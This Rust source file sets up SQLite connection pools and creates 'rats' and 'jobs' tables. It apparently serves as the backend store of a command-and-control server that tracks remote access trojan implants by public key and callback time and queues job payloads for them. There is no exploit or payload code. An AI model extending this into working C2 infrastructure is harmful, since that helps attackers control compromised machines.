use sqlx::sqlite::*;
use std::path::Path;

pub mod tables;

#[derive(Clone)]
pub struct Pool {
    pub writer: sqlx::Pool<Sqlite>,
    pub reader: sqlx::Pool<Sqlite>,
}

pub async fn prepare_database_pool<P: AsRef<Path>>(
    database_location: P,
) -> Result<Pool, sqlx::Error> {
    let writer_options = SqliteConnectOptions::new()
        .filename(database_location)
        .create_if_missing(true)
        .foreign_keys(true)
        .journal_mode(SqliteJournalMode::Wal)
        .synchronous(SqliteSynchronous::Normal);

    let reader_options = writer_options.clone().read_only(true);

    let writer_pool = SqlitePoolOptions::new()
        .max_connections(1)
        .connect_with(writer_options)
        .await?;

    let reader_pool = SqlitePoolOptions::new()
        .connect_with(reader_options)
        .await?;

    let pool = Pool {
        writer: writer_pool,
        reader: reader_pool,
    };

    initialize_tables(&pool).await?;

    Ok(pool)
}

async fn initialize_tables(pool: &Pool) -> Result<(), sqlx::Error> {
    sqlx::query(
        "
CREATE TABLE IF NOT EXISTS rats (
    rat_id INTEGER PRIMARY KEY NOT NULL,
    public_key BLOB NOT NULL,
    first_seen DATETIME NOT NULL,
    last_callback DATETIME NOT NULL,
    alive BOOLEAN NOT NULL
);
        ",
    )
    .execute(&pool.writer)
    .await?;

    sqlx::query(
        "
CREATE TABLE IF NOT EXISTS jobs (
    job_id INTEGER PRIMARY KEY NOT NULL,
    rat_id INTEGER NOT NULL,
    created DATETIME NOT NULL,
    last_update DATETIME NOT NULL,
    started BOOLEAN NOT NULL,
    done BOOLEAN NOT NULL,
    job_type TEXT NOT NULL,
    payload BLOB NOT NULL,
    FOREIGN KEY(rat_id) REFERENCES rats(rat_id)
);
        ",
    )
    .execute(&pool.writer)
    .await?;

    Ok(())
}
